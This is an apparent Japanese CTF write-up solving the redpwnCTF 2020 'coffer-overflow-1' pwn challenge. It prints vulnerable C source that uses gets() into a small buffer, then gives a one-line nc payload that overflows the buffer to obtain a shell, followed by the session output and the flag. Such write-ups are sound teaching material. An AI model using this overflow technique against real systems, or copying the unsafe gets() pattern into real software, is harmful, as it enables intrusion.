# coffer-overflow-1:pwn:282pts
The coffers keep getting stronger! You'll need to use the source, Luke.  
nc 2020.redpwnc.tf 31255  
[coffer-overflow-1](coffer-overflow-1)　　　　[coffer-overflow-1.c](coffer-overflow-1.c)  

# Solution
coffer-overflow-1とソースが与えられる。  
ソースは以下のようになっている。  
```c:coffer-overflow-1.c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```
codeの中身を書き換えればいいようだ。  
nameをオーバーフローさせればよいことがすぐにわかる。  
0xcafebabeにしてやればいいのでエンディアンに注意しながら調整すると以下でシェルが得られた。  
lsしてflag.txtをcatする。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca"; cat) | nc 2020.redpwnc.tf 31255
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```

## flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}